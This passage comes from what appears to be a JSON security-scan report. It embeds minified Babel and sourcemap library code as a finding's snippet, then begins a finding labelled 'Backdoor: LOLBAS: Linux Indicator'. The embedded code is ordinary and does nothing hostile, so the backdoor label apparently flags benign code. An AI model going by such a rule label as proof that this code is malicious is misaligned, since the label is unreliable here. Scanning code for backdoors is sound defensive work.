bY.default({identifier:o,scope:this,path:n,kind:t})}}}addGlobal(t){this.globals[t.name]=t}hasUid(t){let r=this;do if(r.uids[t])return!0;while(r=r.parent);return!1}hasGlobal(t){let r=this;do if(r.globals[t])return!0;while(r=r.parent);return!1}hasReference(t){return!!this.getProgramParent().references[t]}isPure(t,r){if(Qs(t)){let a=this.getBinding(t.name);return a?r?a.constant:!0:!1}else{if(xS(t)||XY(t)||AS(t)||JY(t))return!0;if(PY(t)){var n;return t.superClass&&!this.isPure(t.superClass,r)||((n=t.decorators)==null?void 0:n.length)>0?!1:this.isPure(t.body,r)}else if(AY(t)){for(let a of t.body)if(!this.isPure(a,r))return!1;return!0}else{if(xY(t))return this.isPure(t.left,r)&&this.isPure(t.right,r);if(TS(t)||HY(t)){for(let a of t.elements)if(a!==null&&!this.isPure(a,r))return!1;return!0}else if(BY(t)||GY(t)){for(let a of t.properties)if(!this.isPure(a,r))return!1;return!0}else if(_Y(t)){var s;return!(t.computed&&!this.isPure(t.key,r)||((s=t.decorators)==null?void 0:s.length)>0)}else if(FY(t)){var i;return!(t.computed&&!this.isPure(t.key,r)||((i=t.decorators)==null?void 0:i.length)>0||(YY(t)||t.static)&&t.value!==null&&!this.isPure(t.value,r))}else{if(qY(t))return this.isPure(t.argument,r);if(DS(t)){for(let a of t.expressions)if(!this.isPure(a,r))return!1;return!0}else return RY(t)?PS(t.tag,\"String.raw\")&&!this.hasBinding(\"String\",{noGlobals:!0})&&this.isPure(t.quasi,r):OY(t)?!t.computed&&Qs(t.object)&&t.object.name===\"Symbol\"&&Qs(t.property)&&t.property.name!==\"for\"&&!this.hasBinding(\"Symbol\",{noGlobals:!0}):SS(t)?PS(t.callee,\"Symbol.for\")&&!this.hasBinding(\"Symbol\",{noGlobals:!0})&&t.arguments.length===1&&vY.isStringLiteral(t.arguments[0]):jY(t)}}}}setData(t,r){return this.data[t]=r}getData(t){let r=this;do{let n=r.data[t];if(n!=null)return n}while(r=r.parent)}removeData(t){let r=this;do r.data[t]!=null&&(r.data[t]=null);while(r=r.parent)}init(){this.inited||(this.inited=!0,this.crawl())}crawl(){let t=this.path;this.references=Object.create(null),this.bindings=Object.create(null),this.globals=Object.create(null),this.uids=Object.create(null),this.data=Object.create(null);let r=this.getProgramParent();if(r.crawling)return;let n={references:[],constantViolations:[],assignments:[]};if(this.crawling=!0,t.type!==\"Program\"&&(0,TY.isExplodedVisitor)(pu)){for(let i of pu.enter)i.call(n,t,n);let s=pu[t.type];if(s)for(let i of s.enter)i.call(n,t,n)}t.traverse(pu,n),this.crawling=!1;for(let s of n.assignments){let i=s.getBindingIdentifiers();for(let a of Object.keys(i))s.scope.getBinding(a)||r.addGlobal(i[a]);s.scope.registerConstantViolation(s)}for(let s of n.references){let i=s.scope.getBinding(s.node.name);i?i.reference(s):r.addGlobal(s.node)}for(let s of n.constantViolations)s.scope.registerConstantViolation(s)}push(t){let r=this.path;r.isPattern()?r=this.getPatternParent().path:!r.isBlockStatement()&&!r.isProgram()&&(r=this.getBlockParent().path),r.isSwitchStatement()&&(r=(this.getFunctionParent()||this.getProgramParent()).path);let{init:n,unique:s,kind:i=\"var\",id:a}=t;if(!n&&!s&&(i===\"var\"||i===\"let\")&&r.isFunction()&&!r.node.name&&SS(r.parent,{callee:r.node})&&r.parent.arguments.length<=r.node.params.length&&Qs(a)){r.pushContainer(\"params\",a),r.scope.registerBinding(\"param\",r.get(\"params\")[r.node.params.length-1]);return}(r.isLoop()||r.isCatchClause()||r.isFunction())&&(r.ensureBlock(),r=r.get(\"body\"));let o=t._blockHoist==null?2:t._blockHoist,l=`declaration:${i}:${o}`,u=!s&&r.getData(l);if(!u){let p=WY(i,[]);p._blockHoist=o,[u]=r.unshiftContainer(\"body\",[p]),s||r.setData(l,u)}let c=KY(a,n),f=u.node.declarations.push(c);r.scope.registerBinding(i,u.get(\"declarations\")[f-1])}getProgramParent(){let t=this;do if(t.path.isProgram())return t;while(t=t.parent);throw new Error(\"Couldn't find a Program\")}getFunctionParent(){let t=this;do if(t.path.isFunctionParent())return t;while(t=t.parent);return null}getBlockParent(){let t=this;do if(t.path.isBlockParent())return t;while(t=t.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getPatternParent(){let t=this;do if(!t.path.isPattern())return t.getBlockParent();while(t=t.parent.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getAllBindings(){let t=Object.create(null),r=this;do{for(let n of Object.keys(r.bindings))n in t||(t[n]=r.bindings[n]);r=r.parent}while(r);return t}getAllBindingsOfKind(...t){let r=Object.create(null);for(let n of t){let s=this;do{for(let i of Object.keys(s.bindings)){let a=s.bindings[i];a.kind===n&&(r[i]=a)}s=s.parent}while(s)}return r}bindingIdentifierEquals(t,r){return this.getBindingIdentifier(t)===r}getBinding(t){let r=this,n;do{let i=r.getOwnBinding(t);if(i){var s;if(!((s=n)!=null&&s.isPattern()&&i.kind!==\"param\"&&i.kind!==\"local\"))return i}else if(!i&&t===\"arguments\"&&r.path.isFunction()&&!r.path.isArrowFunctionExpression())break;n=r.path}while(r=r.parent)}getOwnBinding(t){return this.bindings[t]}getBindingIdentifier(t){var r;return(r=this.getBinding(t))==null?void 0:r.identifier}getOwnBindingIdentifier(t){let r=this.bindings[t];return r==null?void 0:r.identifier}hasOwnBinding(t){return!!this.getOwnBinding(t)}hasBinding(t,r){var n,s,i;return t?!!(this.hasOwnBinding(t)||(typeof r==\"boolean\"&&(r={noGlobals:r}),this.parentHasBinding(t,r))||!((n=r)!=null&&n.noUids)&&this.hasUid(t)||!((s=r)!=null&&s.noGlobals)&&e.globals.includes(t)||!((i=r)!=null&&i.noGlobals)&&e.contextVariables.includes(t)):!1}parentHasBinding(t,r){var n;return(n=this.parent)==null?void 0:n.hasBinding(t,r)}moveBindingTo(t,r){let n=this.getBinding(t);n&&(n.scope.removeOwnBinding(t),n.scope=r,r.bindings[t]=n)}removeOwnBinding(t){delete this.bindings[t]}removeBinding(t){var r;(r=this.getBinding(t))==null||r.scope.removeOwnBinding(t);let n=this;do n.uids[t]&&(n.uids[t]=!1);while(n=n.parent)}};du.default=so;so.globals=Object.keys(EY.builtin);so.contextVariables=[\"arguments\",\"undefined\",\"Infinity\",\"NaN\"]});var OS=E((hu,IS)=>{(function(e,t){typeof hu==\"object\"&&typeof IS!=\"undefined\"?t(hu):typeof define==\"function\"&&define.amd?define([\"exports\"],t):(e=typeof globalThis!=\"undefined\"?globalThis:e||self,t(e.setArray={}))})(hu,function(e){\"use strict\";class t{constructor(){this._indexes={__proto__:null},this.array=[]}}function r(o){return o}function n(o,l){return o._indexes[l]}function s(o,l){let u=n(o,l);if(u!==void 0)return u;let{array:c,_indexes:f}=o,p=c.push(l);return f[l]=p-1}function i(o){let{array:l,_indexes:u}=o;if(l.length===0)return;let c=l.pop();u[c]=void 0}function a(o,l){let u=n(o,l);if(u===void 0)return;let{array:c,_indexes:f}=o;for(let p=u+1;p<c.length;p++){let m=c[p];c[p-1]=m,f[m]--}f[l]=void 0,c.pop()}e.SetArray=t,e.get=n,e.pop=i,e.put=s,e.remove=a,Object.defineProperty(e,\"__esModule\",{value:!0})})});var hm=E((mu,_S)=>{(function(e,t){typeof mu==\"object\"&&typeof _S!=\"undefined\"?t(mu):typeof define==\"function\"&&define.amd?define([\"exports\"],t):(e=typeof globalThis!=\"undefined\"?globalThis:e||self,t(e.sourcemapCodec={}))})(mu,function(e){\"use strict\";let t=\",\".charCodeAt(0),r=\";\".charCodeAt(0),n=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\",s=new Uint8Array(64),i=new Uint8Array(128);for(let d=0;d<n.length;d++){let y=n.charCodeAt(d);s[d]=y,i[y]=d}let a=typeof TextDecoder!=\"undefined\"?new TextDecoder:typeof Buffer!=\"undefined\"?{decode(d){return Buffer.from(d.buffer,d.byteOffset,d.byteLength).toString()}}:{decode(d){let y=\"\";for(let v=0;v<d.length;v++)y+=String.fromCharCode(d[v]);return y}};function o(d){let y=new Int32Array(5),v=[],I=0;do{let D=l(d,I),O=[],_=!0,F=0;y[0]=0;for(let R=I;R<D;R++){let K;R=u(d,R,y,0);let te=y[0];te<F&&(_=!1),F=te,c(d,R,D)?(R=u(d,R,y,1),R=u(d,R,y,2),R=u(d,R,y,3),c(d,R,D)?(R=u(d,R,y,4),K=[te,y[1],y[2],y[3],y[4]]):K=[te,y[1],y[2],y[3]]):K=[te],O.push(K)}_||f(O),v.push(O),I=D+1}while(I<=d.length);return v}function l(d,y){let v=d.indexOf(\";\",y);return v===-1?d.length:v}function u(d,y,v,I){let D=0,O=0,_=0;do{let R=d.charCodeAt(y++);_=i[R],D|=(_&31)<<O,O+=5}while(_&32);let F=D&1;return D>>>=1,F&&(D=-2147483648|-D),v[I]+=D,y}function c(d,y,v){return y>=v?!1:d.charCodeAt(y)!==t}function f(d){d.sort(p)}function p(d,y){return d[0]-y[0]}function m(d){let y=new Int32Array(5),v=1024*16,I=v-36,D=new Uint8Array(v),O=D.subarray(0,I),_=0,F=\"\";for(let R=0;R<d.length;R++){let K=d[R];if(R>0&&(_===v&&(F+=a.decode(D),_=0),D[_++]=r),K.length!==0){y[0]=0;for(let te=0;te<K.length;te++){let se=K[te];_>I&&(F+=a.decode(O),D.copyWithin(0,I,_),_-=I),te>0&&(D[_++]=t),_=b(D,_,y,se,0),se.length!==1&&(_=b(D,_,y,se,1),_=b(D,_,y,se,2),_=b(D,_,y,se,3),se.length!==4&&(_=b(D,_,y,se,4)))}}}return F+a.decode(D.subarray(0,_))}function b(d,y,v,I,D){let O=I[D],_=O-v[D];v[D]=O,_=_<0?-_<<1|1:_<<1;do{let F=_&31;_>>>=5,_>0&&(F|=32),d[y++]=s[F]}while(_>0);return y}e.decode=o,e.encode=m,Object.defineProperty(e,\"__esModule\",{value:!0})})});var NS=E((mm,ym)=>{(function(e,t){typeof mm==\"object\"&&typeof ym!=\"undefined\"?ym.exports=t():typeof define==\"function\"&&define.amd?define(t):(e=typeof globalThis!=\"undefined\"?globalThis:e||self,e.resolveURI=t())})(mm,function(){\"use strict\";let e=/^[\\w+.-]+:\\/\\//,t=/^([\\w+.-]+:)\\/\\/([^@/#?]*@)?([^:/#?]*)(:\\d+)?(\\/[^#?]*)?(\\?[^#]*)?(#.*)?/,r=/^file:(?:\\/\\/((?![a-z]:)[^/#?]*)?)?(\\/?[^#?]*)(\\?[^#]*)?(#.*)?/i;var n;(function(v){v[v.Empty=1]=\"Empty\",v[v.Hash=2]=\"Hash\",v[v.Query=3]=\"Query\",v[v.RelativePath=4]=\"RelativePath\",v[v.AbsolutePath=5]=\"AbsolutePath\",v[v.SchemeRelative=6]=\"SchemeRelative\",v[v.Absolute=7]=\"Absolute\"})(n||(n={}));function s(v){return e.test(v)}function i(v){return v.startsWith(\"//\")}function a(v){return v.startsWith(\"/\")}function o(v){return v.startsWith(\"file:\")}function l(v){return/^[.?#]/.test(v)}function u(v){let I=t.exec(v);return f(I[1],I[2]||\"\",I[3],I[4]||\"\",I[5]||\"/\",I[6]||\"\",I[7]||\"\")}function c(v){let I=r.exec(v),D=I[2];return f(\"file:\",\"\",I[1]||\"\",\"\",a(D)?D:\"/\"+D,I[3]||\"\",I[4]||\"\")}function f(v,I,D,O,_,F,R){return{scheme:v,user:I,host:D,port:O,path:_,query:F,hash:R,type:n.Absolute}}function p(v){if(i(v)){let D=u(\"http:\"+v);return D.scheme=\"\",D.type=n.SchemeRelative,D}if(a(v)){let D=u(\"http://foo.com\"+v);return D.scheme=\"\",D.host=\"\",D.type=n.AbsolutePath,D}if(o(v))return c(v);if(s(v))return u(v);let I=u(\"http://foo.com/\"+v);return I.scheme=\"\",I.host=\"\",I.type=v?v.startsWith(\"?\")?n.Query:v.startsWith(\"#\")?n.Hash:n.RelativePath:n.Empty,I}function m(v){if(v.endsWith(\"/..\"))return v;let I=v.lastIndexOf(\"/\");return v.slice(0,I+1)}function b(v,I){d(I,I.type),v.path===\"/\"?v.path=I.path:v.path=m(I.path)+v.path}function d(v,I){let D=I<=n.RelativePath,O=v.path.split(\"/\"),_=1,F=0,R=!1;for(let te=1;te<O.length;te++){let se=O[te];if(!se){R=!0;continue}if(R=!1,se!==\".\"){if(se===\"..\"){F?(R=!0,F--,_--):D&&(O[_++]=se);continue}O[_++]=se,F++}}let K=\"\";for(let te=1;te<_;te++)K+=\"/\"+O[te];(!K||R&&!K.endsWith(\"/..\"))&&(K+=\"/\"),v.path=K}function y(v,I){if(!v&&!I)return\"\";let D=p(v),O=D.type;if(I&&O!==n.Absolute){let F=p(I),R=F.type;switch(O){case n.Empty:D.hash=F.hash;case n.Hash:D.query=F.query;case n.Query:case n.RelativePath:b(D,F);case n.AbsolutePath:D.user=F.user,D.host=F.host,D.port=F.port;case n.SchemeRelative:D.scheme=F.scheme}R>O&&(O=R)}d(D,O);let _=D.query+D.hash;switch(O){case n.Hash:case n.Query:return _;case n.RelativePath:{let F=D.path.slice(1);return F?l(I||v)&&!l(F)?\"./\"+F+_:F+_:_||\".\"}case n.AbsolutePath:return D.path+_;default:return D.scheme+\"//\"+D.user+D.host+D.port+D.path+_}}return y})});var gu=E((yu,kS)=>{(function(e,t){typeof yu==\"object\"&&typeof kS!=\"undefined\"?t(yu,hm(),NS()):typeof define==\"function\"&&define.amd?define([\"exports\",\"@jridgewell/sourcemap-codec\",\"@jridgewell/resolve-uri\"],t):(e=typeof globalThis!=\"undefined\"?globalThis:e||self,t(e.traceMapping={},e.sourcemapCodec,e.resolveURI))})(yu,function(e,t,r){\"use strict\";function n(M,$){return $&&!$.endsWith(\"/\")&&($+=\"/\"),r(M,$)}function s(M){if(!M)return\"\";let $=M.lastIndexOf(\"/\");return M.slice(0,$+1)}let i=0,a=1,o=2,l=3,u=4,c=1,f=2;function p(M,$){let W=m(M,0);if(W===M.length)return M;$||(M=M.slice());for(let J=W;J<M.length;J=m(M,J+1))M[J]=d(M[J],$);return M}function m(M,$){for(let W=$;W<M.length;W++)if(!b(M[W]))return W;return M.length}function b(M){for(let $=1;$<M.length;$++)if(M[$][i]<M[$-1][i])return!1;return!0}function d(M,$){return $||(M=M.slice()),M.sort(y)}function y(M,$){return M[i]-$[i]}let v=!1;function I(M,$,W,J){for(;W<=J;){let Ae=W+(J-W>>1),le=M[Ae][i]-$;if(le===0)return v=!0,Ae;le<0?W=Ae+1:J=Ae-1}return v=!1,W-1}function D(M,$,W){for(let J=W+1;J<M.length&&M[J][i]===$;W=J++);return W}function O(M,$,W){for(let J=W-1;J>=0&&M[J][i]===$;W=J--);return W}function _(){return{lastKey:-1,lastNeedle:-1,lastIndex:-1}}function F(M,$,W,J){let{lastKey:Ae,lastNeedle:le,lastIndex:_e}=W,Re=0,we=M.length-1;if(J===Ae){if($===le)return v=_e!==-1&&M[_e][i]===$,_e;$>=le?Re=_e===-1?0:_e:we=_e}return W.lastKey=J,W.lastNeedle=$,W.lastIndex=I(M,$,Re,we)}function R(M,$){let W=$.map(te);for(let J=0;J<M.length;J++){let Ae=M[J];for(let le=0;le<Ae.length;le++){let _e=Ae[le];if(_e.length===1)continue;let Re=_e[a],we=_e[o],nt=_e[l],vt=W[Re],Je=vt[we]||(vt[we]=[]),st=$[Re],xt=D(Je,nt,F(Je,nt,st,we));st.lastIndex=++xt,K(Je,xt,[nt,J,_e[i]])}}return W}function K(M,$,W){for(let J=M.length;J>$;J--)M[J]=M[J-1];M[$]=W}function te(){return{__proto__:null}}let se=function(M,$){let W=Te(M);if(!(\"sections\"in W))return new Se(W,$);let J=[],Ae=[],le=[],_e=[],Re=[];Pe(W,$,J,Ae,le,_e,Re,0,0,1/0,1/0);let we={version:3,file:W.file,names:_e,sources:Ae,sourcesContent:le,mappings:J,ignoreList:Re};return Ma(we)};function Te(M){return typeof M==\"string\"?JSON.parse(M):M}function Pe(M,$,W,J,Ae,le,_e,Re,we,nt,vt){let{sections:Je}=M;for(let st=0;st<Je.length;st++){let{map:xt,offset:Ot}=Je[st],Ar=nt,dn=vt;if(st+1<Je.length){let ns=Je[st+1].offset;Ar=Math.min(nt,Re+ns.line),Ar===nt?dn=Math.min(vt,we+ns.column):Ar<nt&&(dn=we+ns.column)}Be(xt,$,W,J,Ae,le,_e,Re+Ot.line,we+Ot.column,Ar,dn)}}function Be(M,$,W,J,Ae,le,_e,Re,we,nt,vt){let Je=Te(M);if(\"sections\"in Je)return Pe(...arguments);let st=new Se(Je,$),xt=J.length,Ot=le.length,Ar=qe(st),{resolvedSources:dn,sourcesContent:ns,ignoreList:wi}=st;if(dt(J,dn),dt(le,st.names),ns)dt(Ae,ns);else for(let lr=0;lr<dn.length;lr++)Ae.push(null);if(wi)for(let lr=0;lr<wi.length;lr++)_e.push(wi[lr]+xt);for(let lr=0;lr<Ar.length;lr++){let Di=Re+lr;if(Di>nt)return;let F1=j(W,Di),C3=lr===0?we:0,j1=Ar[lr];for(let Yp=0;Yp<j1.length;Yp++){let Vs=j1[Yp],Nl=C3+Vs[i];if(Di===nt&&Nl>=vt)return;if(Vs.length===1){F1.push([Nl]);continue}let L1=xt+Vs[a],M1=Vs[o],R1=Vs[l];F1.push(Vs.length===4?[Nl,L1,M1,R1]:[Nl,L1,M1,R1,Ot+Vs[u]])}}}function dt(M,$){for(let W=0;W<$.length;W++)M.push($[W])}function j(M,$){for(let W=M.length;W<=$;W++)M[W]=[];return M[$]}let q=\"`line` must be greater than 0 (lines start at line 1)\",Y=\"`column` must be greater than or equal to 0 (columns start at column 0)\",re=-1,me=1;class Se{constructor($,W){let J=typeof $==\"string\";if(!J&&$._decodedMemo)return $;let Ae=J?JSON.parse($):$,{version:le,file:_e,names:Re,sourceRoot:we,sources:nt,sourcesContent:vt}=Ae;this.version=le,this.file=_e,this.names=Re||[],this.sourceRoot=we,this.sources=nt,this.sourcesContent=vt,this.ignoreList=Ae.ignoreList||Ae.x_google_ignoreList||void 0;let Je=n(we||\"\",s(W));this.resolvedSources=nt.map(xt=>n(xt||\"\",Je));let{mappings:st}=Ae;typeof st==\"string\"?(this._encoded=st,this._decoded=void 0):(this._encoded=void 0,this._decoded=p(st,J)),this._decodedMemo=_(),this._bySources=void 0,this._bySourceMemos=void 0}}function pe(M){return M}function Fe(M){var $,W;return($=(W=M)._encoded)!==null&&$!==void 0?$:W._encoded=t.encode(M._decoded)}function qe(M){var $;return($=M)._decoded||($._decoded=t.decode(M._encoded))}function Ge(M,$,W){let J=qe(M);if($>=J.length)return null;let Ae=J[$],le=oe(Ae,M._decodedMemo,$,W,me);return le===-1?null:Ae[le]}function fe(M,$){let{line:W,column:J,bias:Ae}=$;if(W--,W<0)throw new Error(q);if(J<0)throw new Error(Y);let le=qe(M);if(W>=le.length)return Us(null,null,null,null);let _e=le[W],Re=oe(_e,M._decodedMemo,W,J,Ae||me);if(Re===-1)return Us(null,null,null,null);let we=_e[Re];if(we.length===1)return Us(null,null,null,null);let{names:nt,resolvedSources:vt}=M;return Us(vt[we[a]],we[o]+1,we[l],we.length===5?nt[we[u]]:null)}function Qe(M,$){let{source:W,line:J,column:Ae,bias:le}=$;return je(M,W,J,Ae,le||me,!1)}function It(M,$){let{source:W,line:J,column:Ae,bias:le}=$;return je(M,W,J,Ae,le||re,!0)}function Rt(M,$){let W=qe(M),{names:J,resolvedSources:Ae}=M;for(let le=0;le<W.length;le++){let _e=W[le];for(let Re=0;Re<_e.length;Re++){let we=_e[Re],nt=le+1,vt=we[0],Je=null,st=null,xt=null,Ot=null;we.length!==1&&(Je=Ae[we[1]],st=we[2]+1,xt=we[3]),we.length===5&&(Ot=J[we[4]]),$({generatedLine:nt,generatedColumn:vt,source:Je,originalLine:st,originalColumn:xt,name:Ot})}}}function Pr(M,$){let{sources:W,resolvedSources:J}=M,Ae=W.indexOf($);return Ae===-1&&(Ae=J.indexOf($)),Ae}function fn(M,$){let{sourcesContent:W}=M;if(W==null)return null;let J=Pr(M,$);return J===-1?null:W[J]}function An(M,$){let{ignoreList:W}=M;if(W==null)return!1;let J=Pr(M,$);return J===-1?!1:W.includes(J)}function Ma(M,$){let W=new Se(Cn(M,[]),$);return W._decoded=M.mappings,W}function Rs(M){return Cn(M,qe(M))}function qs(M){return Cn(M,Fe(M))}function Cn(M,$){return{version:M.version,file:M.file,names:M.names,sourceRoot:M.sourceRoot,sources:M.sources,sourcesContent:M.sourcesContent,mappings:$,ignoreList:M.ignoreList||M.x_google_ignoreList}}function Us(M,$,W,J){return{source:M,line:$,column:W,name:J}}function pn(M,$){return{line:M,column:$}}function oe(M,$,W,J,Ae){let le=F(M,J,$,W);return v?le=(Ae===re?D:O)(M,J,le):Ae===re&&le++,le===-1||le===M.length?-1:le}function ee(M,$,W,J,Ae){let le=oe(M,$,W,J,me);if(!v&&Ae===re&&le++,le===-1||le===M.length)return[];let _e=v?J:M[le][i];v||(le=O(M,_e,le));let Re=D(M,_e,le),we=[];for(;le<=Re;le++){let nt=M[le];we.push(pn(nt[c]+1,nt[f]))}return we}function je(M,$,W,J,Ae,le){var _e;if(W--,W<0)throw new Error(q);if(J<0)throw new Error(Y);let{sources:Re,resolvedSources:we}=M,nt=Re.indexOf($);if(nt===-1&&(nt=we.indexOf($)),nt===-1)return le?[]:pn(null,null);let Je=((_e=M)._bySources||(_e._bySources=R(qe(M),M._bySourceMemos=Re.map(_))))[nt][W];if(Je==null)return le?[]:pn(null,null);let st=M._bySourceMemos[nt];if(le)return ee(Je,st,W,J,Ae);let xt=oe(Je,st,W,J,Ae);if(xt===-1)return pn(null,null);let Ot=Je[xt];return pn(Ot[c]+1,Ot[f])}e.AnyMap=se,e.GREATEST_LOWER_BOUND=me,e.LEAST_UPPER_BOUND=re,e.TraceMap=Se,e.allGeneratedPositionsFor=It,e.decodedMap=Rs,e.decodedMappings=qe,e.eachMapping=Rt,e.encodedMap=qs,e.encodedMappings=Fe,e.generatedPositionFor=Qe,e.isIgnored=An,e.originalPositionFor=fe,e.presortedDecodedMap=Ma,e.sourceContentFor=fn,e.traceSegment=Ge})});var gm=E((bu,BS)=>{(function(e,t){typeof bu==\"object\"&&typeof BS!=\"undefined\"?t(bu,OS(),hm(),gu()):typeof define==\"function\"&&define.amd?define([\"exports\",\"@jridgewell/set-array\",\"@jridgewell/sourcemap-codec\",\"@jridgewell/trace-mapping\"],t):(e=typeof globalThis!=\"undefined\"?globalThis:e||self,t(e.genMapping={},e.setArray,e.sourcemapCodec,e.traceMapping))})(bu,function(e,t,r,n){\"use strict\";class c{constructor({file:q,sourceRoot:Y}={}){this._names=new t.SetArray,this._sources=new t.SetArray,this._sourcesContent=[],this._mappings=[],this.file=q,this.sourceRoot=Y,this._ignoreList=new t.SetArray}}function f(j){return j}function p(j,q,Y,re,me,Se,pe,Fe){return F(!1,j,q,Y,re,me,Se,pe,Fe)}function m(j,q){return dt(!1,j,q)}let b=(j,q,Y,re,me,Se,pe,Fe)=>F(!0,j,q,Y,re,me,Se,pe,Fe),d=(j,q)=>dt(!0,j,q);function y(j,q,Y){let{_sources:re,_sourcesContent:me}=j,Se=t.put(re,q);me[Se]=Y}function v(j,q,Y=!0){let{_sources:re,_sourcesContent:me,_ignoreList:Se}=j,pe=t.put(re,q);pe===me.length&&(me[pe]=null),Y?t.put(Se,pe):t.remove(Se,pe)}function I(j){let{_mappings:q,_sources:Y,_sourcesContent:re,_names:me,_ignoreList:Se}=j;return se(q),{version:3,file:j.file||void 0,names:me.array,sourceRoot:j.sourceRoot||void 0,sources:Y.array,sourcesContent:re,mappings:q,ignoreList:Se.array}}function D(j){let q=I(j);return Object.assign(Object.assign({},q),{mappings:r.encode(q.mappings)})}function O(j){let q=new n.TraceMap(j),Y=new c({file:q.file,sourceRoot:q.sourceRoot});return Te(Y._names,q.names),Te(Y._sources,q.sources),Y._sourcesContent=q.sourcesContent||q.sources.map(()=>null),Y._mappings=n.decodedMappings(q),q.ignoreList&&Te(Y._ignoreList,q.ignoreList),Y}function _(j){let q=[],{_mappings:Y,_sources:re,_names:me}=j;for(let Se=0;Se<Y.length;Se++){let pe=Y[Se];for(let Fe=0;Fe<pe.length;Fe++){let qe=pe[Fe],Ge={line:Se+1,column:qe[0]},fe,Qe,It;qe.length!==1&&(fe=re.array[qe[1]],Qe={line:qe[2]+1,column:qe[3]},qe.length===5&&(It=me.array[qe[4]])),q.push({generated:Ge,source:fe,original:Qe,name:It})}}return q}function F(j,q,Y,re,me,Se,pe,Fe,qe){let{_mappings:Ge,_sources:fe,_sourcesContent:Qe,_names:It}=q,Rt=R(Ge,Y),Pr=K(Rt,re);if(!me)return j&&Pe(Rt,Pr)?void 0:te(Rt,Pr,[re]);let fn=t.put(fe,me),An=Fe?t.put(It,Fe):-1;if(fn===Qe.length&&(Qe[fn]=qe!=null?qe:null),!(j&&Be(Rt,Pr,fn,Se,pe,An)))return te(Rt,Pr,Fe?[re,fn,Se,pe,An]:[re,fn,Se,pe])}function R(j,q){for(let Y=j.length;Y<=q;Y++)j[Y]=[];return j[q]}function K(j,q){let Y=j.length;for(let re=Y-1;re>=0;Y=re--){let me=j[re];if(q>=me[0])break}return Y}function te(j,q,Y){for(let re=j.length;re>q;re--)j[re]=j[re-1];j[q]=Y}function se(j){let{length:q}=j,Y=q;for(let re=Y-1;re>=0&&!(j[re].length>0);Y=re,re--);Y<q&&(j.length=Y)}function Te(j,q){for(let Y=0;Y<q.length;Y++)t.put(j,q[Y])}function Pe(j,q){return q===0?!0:j[q-1].length===1}function Be(j,q,Y,re,me,Se){if(q===0)return!1;let pe=j[q-1];return pe.length===1?!1:Y===pe[1]&&re===pe[2]&&me===pe[3]&&Se===(pe.length===5?pe[4]:-1)}function dt(j,q,Y){let{generated:re,source:me,original:Se,name:pe,content:Fe}=Y;return me?F(j,q,re.line-1,re.column,me,Se.line-1,Se.column,pe,Fe):F(j,q,re.line-1,re.column,null,null,null,null,null)}e.GenMapping=c,e.addMapping=m,e.addSegment=p,e.allMappings=_,e.fromMap=O,e.maybeAddMapping=d,e.maybeAddSegment=b,e.setIgnore=v,e.setSourceContent=y,e.toDecodedMap=I,e.toEncodedMap=D,Object.defineProperty(e,\"__esModule\",{value:!0})})});var FS=E(Eu=>{\"use strict\";Object.defineProperty(Eu,\"__esModule\",{value:!0});Eu.default=void 0;var fs=gm(),bm=gu(),Em=class{constructor(t,r){var n;this._map=void 0,this._rawMappings=void 0,this._sourceFileName=void 0,this._lastGenLine=0,this._lastSourceLine=0,this._lastSourceColumn=0,this._inputMap=void 0;let s=this._map=new fs.GenMapping({sourceRoot:t.sourceRoot});if(this._sourceFileName=(n=t.sourceFileName)==null?void 0:n.replace(/\\\\/g,\"/\"),this._rawMappings=void 0,t.inputSourceMap){this._inputMap=new bm.TraceMap(t.inputSourceMap);let a=this._inputMap.resolvedSources;if(a.length)for(let o=0;o<a.length;o++){var i;(0,fs.setSourceContent)(s,a[o],(i=this._inputMap.sourcesContent)==null?void 0:i[o])}}if(typeof r==\"string\"&&!t.inputSourceMap)(0,fs.setSourceContent)(s,this._sourceFileName,r);else if(typeof r==\"object\")for(let a of Object.keys(r))(0,fs.setSourceContent)(s,a.replace(/\\\\/g,\"/\"),r[a])}get(){return(0,fs.toEncodedMap)(this._map)}getDecoded(){return(0,fs.toDecodedMap)(this._map)}getRawMappings(){return this._rawMappings||(this._rawMappings=(0,fs.allMappings)(this._map))}mark(t,r,n,s,i,a){var o;this._rawMappings=void 0;let l;if(r!=null)if(this._inputMap){if(l=(0,bm.originalPositionFor)(this._inputMap,{line:r,column:n}),!l.name&&i){let u=(0,bm.originalPositionFor)(this._inputMap,i);u.name&&(s=u.name)}}else l={source:(a==null?void 0:a.replace(/\\\\/g,\"/\"))||this._sourceFileName,line:r,column:n};(0,fs.maybeAddMapping)(this._map,{name:s,generated:t,source:(o=l)==null?void 0:o.source,original:l})}};Eu.default=Em});var jS=E(vu=>{\"use strict\";Object.defineProperty(vu,\"__esModule\",{value:!0});vu.default=void 0;var vm=class{constructor(t,r){this._map=null,this._buf=\"\",this._str=\"\",this._appendCount=0,this._last=0,this._queue=[],this._queueCursor=0,this._canMarkIdName=!0,this._indentChar=\"\",this._fastIndentations=[],this._position={line:1,column:0},this._sourcePosition={identifierName:void 0,identifierNamePos:void 0,line:void 0,column:void 0,filename:void 0},this._map=t,this._indentChar=r;for(let n=0;n<64;n++)this._fastIndentations.push(r.repeat(n));this._allocQueue()}_allocQueue(){let t=this._queue;for(let r=0;r<16;r++)t.push({char:0,repeat:1,line:void 0,column:void 0,identifierName:void 0,identifierNamePos:void 0,filename:\"\"})}_pushQueue(t,r,n,s,i){let a=this._queueCursor;a===this._queue.length&&this._allocQueue();let o=this._queue[a];o.char=t,o.repeat=r,o.line=n,o.column=s,o.filename=i,this._queueCursor++}_popQueue(){if(this._queueCursor===0)throw new Error(\"Cannot pop from empty queue\");return this._queue[--this._queueCursor]}get(){this._flush();let t=this._map,r={code:(this._buf+this._str).trimRight(),decodedMap:t==null?void 0:t.getDecoded(),get __mergedMap(){return this.map},get map(){let n=t?t.get():null;return r.map=n,n},set map(n){Object.defineProperty(r,\"map\",{value:n,writable:!0})},get rawMappings(){let n=t==null?void 0:t.getRawMappings();return r.rawMappings=n,n},set rawMappings(n){Object.defineProperty(r,\"rawMappings\",{value`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
